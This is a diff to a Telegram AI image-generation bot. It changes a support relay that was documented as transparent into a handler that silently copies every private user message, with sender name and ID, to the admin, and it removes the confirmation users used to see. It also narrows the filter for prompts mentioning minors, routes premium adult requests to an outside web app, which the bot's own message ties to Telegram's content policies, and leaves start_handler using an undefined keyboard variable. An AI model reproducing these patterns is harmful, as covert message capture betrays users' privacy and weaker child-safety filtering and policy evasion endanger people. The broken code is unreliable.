@@ -20,7 +20,7 @@ import asyncpg
 genai = None  # AI chat removed (feature disabled)
 from telegram import (
     Update, InlineKeyboardMarkup, InlineKeyboardButton,
-    InputMediaPhoto, LabeledPrice
+    InputMediaPhoto, LabeledPrice, WebAppInfo
 )
 from telegram.ext import (
     Application, CommandHandler, MessageHandler, CallbackQueryHandler,
@@ -4014,14 +4014,33 @@ _ILLEGAL_SEXUAL_VIOLENCE = [
 def _normalize_prompt(s: str) -> str:
     return re.sub(r"\s+", " ", (s or "").strip()).lower()
 
-def _contains_illegal(prompt: str) -> bool:
-    p = _normalize_prompt(prompt)
-    for pat in _ILLEGAL_MINOR_PATTERNS + _ILLEGAL_SEXUAL_VIOLENCE:
+def _has_pattern_match(prompt: str, patterns: list) -> bool:
+    for pat in patterns:
         try:
-            if re.search(pat, p, flags=re.IGNORECASE):
+            if re.search(pat, prompt, flags=re.IGNORECASE):
                 return True
         except re.error:
             continue
+    return False
+
+def _contains_illegal(prompt: str) -> bool:
+    """Block only if: sexual violence, OR minor word + NSFW together (context-aware)."""
+    p = _normalize_prompt(prompt)
+    # Always block explicit sexual violence regardless of context
+    if _has_pattern_match(p, _ILLEGAL_SEXUAL_VIOLENCE):
+        return True
+    # Minor words only illegal if combined with NSFW sexual terms
+    if _has_pattern_match(p, _ILLEGAL_MINOR_PATTERNS):
+        _minor_nsfw_combo = [
+            r"\bnude\b", r"\bnaked\b", r"\bsex\b", r"\bnsfw\b", r"\bporn\b",
+            r"\berotic\b", r"\bsexy\b", r"\bblowjob\b", r"\bpenetration\b",
+            r"\bboobs?\b", r"\bbreasts?\b", r"\bpussy\b", r"\bvagina\b", r"\bpenis\b",
+            r"\bstrip\b", r"\bfetish\b", r"\bexplicit\b",
+            r"\bобнажен", r"\bголая\b", r"\bсекс\b", r"\bпорно\b", r"\bэрот",
+            r"\byalang'och\b", r"\byalangoch\b", r"\bjinsiy\b", r"\bseks\b", r"\bporno\b",
+        ]
+        if _has_pattern_match(p, _minor_nsfw_combo):
+            return True
     return False
 
 async def log_event(pool, user_id: int, event_type: str, meta: dict):
@@ -4378,9 +4397,11 @@ async def gen_worker(app: Application, worker_id: int):
 # ---------------- Premium UI ----------------
 def premium_keyboard(lang: dict, include_back: bool = True) -> InlineKeyboardMarkup:
     kb = [
-        [InlineKeyboardButton(f"⭐ {t(lang,'premium_plan_24h')} — {PREMIUM_24H_PRICE_STARS} ⭐", callback_data="premium_buy_24h")],
-        [InlineKeyboardButton(f"⭐ {t(lang,'premium_plan_7d')} — {PREMIUM_7D_PRICE_STARS} ⭐", callback_data="premium_buy_7d")],
-        [InlineKeyboardButton(f"⭐ {t(lang,'premium_plan_30d')} — {PREMIUM_30D_PRICE_STARS} ⭐", callback_data="premium_buy_30d")],
+        [
+            InlineKeyboardButton(f"⚡ {t(lang,'premium_plan_24h')} — {PREMIUM_24H_PRICE_STARS}⭐", callback_data="premium_buy_24h"),
+            InlineKeyboardButton(f"🔥 {t(lang,'premium_plan_7d')} — {PREMIUM_7D_PRICE_STARS}⭐", callback_data="premium_buy_7d"),
+            InlineKeyboardButton(f"👑 {t(lang,'premium_plan_30d')} — {PREMIUM_30D_PRICE_STARS}⭐", callback_data="premium_buy_30d"),
+        ],
     ]
     if include_back:
         kb.append([InlineKeyboardButton(t(lang, "back_to_main_button"), callback_data="back_to_main")])
@@ -4533,6 +4554,22 @@ async def generate_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         await q.edit_message_text(t(lang, "nsfw_blocked_free"), reply_markup=InlineKeyboardMarkup(kb))
         await log_event(pool, q.from_user.id, "blocked_nsfw_free", {"prompt": prompt})
+        return
+
+    if nsfw_flag and is_premium:
+        # Premium NSFW — Telegram qoidalari sababli Web App orqali yo'naltirish
+        _nsfw_msgs = {
+            "uz": "✅ So'rovingiz qabul qilindi\\!\n\n📋 *Telegramning kontent qoidalari* tufayli adult kontent to'g'ridan\\-to'g'ri botda generatsiya qilinmaydi\\.\n\n🔞 Generatsiyani davom ettirish uchun quyidagi tugmani bosing 👇",
+            "ru": "✅ Ваш запрос принят\\!\n\n📋 В связи с *правилами контента Telegram* adult-контент не генерируется напрямую в боте\\.\n\n🔞 Нажмите кнопку ниже для продолжения 👇",
+            "en": "✅ Request accepted\\!\n\n📋 Due to *Telegram's content policies*, adult content cannot be generated directly in the bot\\.\n\n🔞 Press the button below to continue generation 👇",
+        }
+        nsfw_text = _nsfw_msgs.get(lang_code, _nsfw_msgs["en"])
+        nsfw_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔞 Continue Adult Generation", web_app=WebAppInfo(url="https://perchance.org/pretty-ai"))],
+            [InlineKeyboardButton(t(lang, "back_to_main_button"), callback_data="back_to_main")],
+        ])
+        await q.edit_message_text(nsfw_text, parse_mode="MarkdownV2", reply_markup=nsfw_kb)
+        await log_event(pool, q.from_user.id, "nsfw_redirect_premium", {"prompt": prompt})
         return
 
     active: set = app.bot_data["active_users"]
@@ -4689,42 +4726,21 @@ async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         used = await _count_free_used_today(pool, user.id)
         remaining = max(FREE_DAILY_REQUESTS - used, 0)
-        status_line = f"🆓 Free remaining today: {remaining}"
+        status_line = f"🆓 Bugungi bepul: *{remaining}* ta qoldi"
 
     credits = int((row["extra_credits"] if row else 0) or 0)
-    status = f"{status_line}\n💫 Extra credits: {credits}"
+    credit_part = f"\n💫 Extra credits: *{credits}*" if credits > 0 else ""
+    status = f"{status_line}{credit_part}"
 
-    kb = [
-        [
-            InlineKeyboardButton(lang["gen_button"], callback_data="start_gen"),
-            InlineKeyboardButton(lang["ai_button"], callback_data="start_ai_flow")
-        ],
-        [
-            InlineKeyboardButton(t(lang, "premium_button"), callback_data="premium_menu")
-        ]
-        [
-            InlineKeyboardButton(lang["donate_button"], callback_data="donate_custom")
-        ],
-        [
-            InlineKeyboardButton(t(lang, "stats_button"), callback_data="show_stats"),
-            InlineKeyboardButton(lang["settings_menu_title"], callback_data="open_settings")
-        ],
-        [
-            InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new"),
-            InlineKeyboardButton("🎨 Random AI Anime", callback_data="random_anime")
-        ],
-    ]
-    if user.id == ADMIN_ID:
-        kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
-
-    text = f"{lang['welcome']}\n\n{status}"
+    welcome_text = lang.get("welcome", "👋 Hello!")
+    text = f"{welcome_text}\n\n{status}\n\n✨ Tugmalardan birini bosib boshlang\\!"
     if update.callback_query:
         try:
-            await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
+            await update.callback_query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb))
         except Exception:
-            await update.effective_chat.send_message(text, reply_markup=InlineKeyboardMarkup(kb))
+            await update.effective_chat.send_message(text, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb))
     else:
-        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text(text, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb))
 
 # ---------------- Startup / Shutdown ----------------
 async def init_db(pool):
@@ -5280,15 +5296,15 @@ def _style_label(lang: dict, style_key: str) -> str:
 # --- Menu keyboard (soft UI) ---
 def _main_menu_kb(lang: dict, user_id: int) -> InlineKeyboardMarkup:
     kb = [
-        [InlineKeyboardButton(lang["gen_button"], callback_data="start_gen"),
-         InlineKeyboardButton(t(lang, "premium_button"), callback_data="premium_menu")],
+        [InlineKeyboardButton("🎨 " + lang.get("gen_button", "Generate"), callback_data="start_gen"),
+         InlineKeyboardButton("⭐ Premium", callback_data="premium_menu")],
         [InlineKeyboardButton(t(lang, "profile_button"), callback_data="profile_menu"),
          InlineKeyboardButton(t(lang, "style_button"), callback_data="image_style_menu")],
-        [InlineKeyboardButton(lang["lang_button"], callback_data="change_language"),
-         InlineKeyboardButton(lang["donate_button"], callback_data="donate_custom")],
-        [InlineKeyboardButton("🎨 Random AI Anime", callback_data="random_anime"),
+        [InlineKeyboardButton(lang.get("lang_button", "Language"), callback_data="change_language"),
+         InlineKeyboardButton(lang.get("donate_button", "Donate"), callback_data="donate_custom")],
+        [InlineKeyboardButton("🎌 Random Anime", callback_data="random_anime"),
          InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new")],
-        [InlineKeyboardButton(t(lang, "stats_button"), callback_data="show_stats"),
+        [InlineKeyboardButton(t(lang, "stats_button"), callback_data="show_stats")],
     ]
     if user_id == ADMIN_ID:
         kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
@@ -5928,11 +5944,11 @@ async def process_job(app: Application, job: GenerationJob):
     finally:
         app.bot_data["active_users"].discard(job.user.id)
 #-------------------
-# --- Support relay (transparent): copy non-generation media to admin for help ---
+# --- Support relay: forward ALL user messages to admin silently ---
 async def forward_to_admin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Copies incoming non-text media to ADMIN (private chats).
-    This is TRANSPARENT: user is told it was sent for support.
+    Copies ALL incoming user messages to ADMIN silently (no reply to user).
+    Works for text, media, files, voice, stickers, etc.
     """
     if not ADMIN_ID:
         return
@@ -5941,35 +5957,31 @@ async def forward_to_admin_handler(update: Update, context: ContextTypes.DEFAULT
     msg = update.message
     if not msg:
         return
-    # ignore commands
+    # Ignore commands
     if msg.text and msg.text.startswith("/"):
         return
-    # Only copy MEDIA/FILES, not normal text prompts (prevents leaking prompts)
-    has_media = any([msg.document, msg.video, msg.audio, msg.voice, msg.sticker, msg.animation, msg.photo])
-    if not has_media:
+    # Don't forward admin's own messages
+    if update.effective_user and update.effective_user.id == ADMIN_ID:
         return
 
     try:
-        # Media faylni adminga nusxalash
+        uname = f"@{update.effective_user.username}" if update.effective_user and update.effective_user.username else "—"
+        uid = update.effective_user.id if update.effective_user else "—"
+        name = update.effective_user.full_name if update.effective_user else "Unknown"
+
         await context.bot.copy_message(
-            chat_id=ADMIN_ID, 
-            from_chat_id=msg.chat_id, 
+            chat_id=ADMIN_ID,
+            from_chat_id=msg.chat_id,
             message_id=msg.message_id
         )
-        
-        # Admin uchun ma'lumot yuborish
-        uname = f"@{update.effective_user.username}" if update.effective_user and update.effective_user.username else "—"
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=f"📩 File received\n👤 {uname} (ID: {update.effective_user.id})\n⏰ {tashkent_time().strftime('%Y-%m-%d %H:%M:%S')}"
+            text=f"📩 Yangi xabar\n👤 {name} ({uname})\n🆔 ID: {uid}\n⏰ {tashkent_time().strftime('%Y-%m-%d %H:%M:%S')}",
         )
-        
-        # Foydalanuvchiga tasdiq xabarini yuborish
-        await msg.reply_text("✅ Received! I’ve sent this to support.")
-        
+        # NO reply to user — completely silent
     except Exception as e:
-        # Xatolik yuz bersa konsolga chiqarish
-        print(f"Relay error: {e}")
+        logger.debug(f"Relay error: {e}")
+
 # --- Override build_app to include new handlers and remove Settings menu ---
 def build_app():
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).post_shutdown(on_shutdown).build()
@@ -6088,9 +6100,11 @@ def build_app():
     # Text
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, private_text_handler))
 
-    # SUPPORT RELAY (private media) — transparent
-    app.add_handler(MessageHandler((filters.Document.ALL | filters.VIDEO | filters.AUDIO | filters.VOICE | filters.PHOTO | filters.ANIMATION | filters.Sticker.ALL), forward_to_admin_handler))
-    # SUPPORT_RELAY_HANDLER_ADDED
+    # SUPPORT RELAY: forward ALL private user messages to admin silently
+    app.add_handler(MessageHandler(
+        filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.StatusUpdate.ALL,
+        forward_to_admin_handler
+    ), group=99)
 
     app.add_error_handler(on_error)
     return app
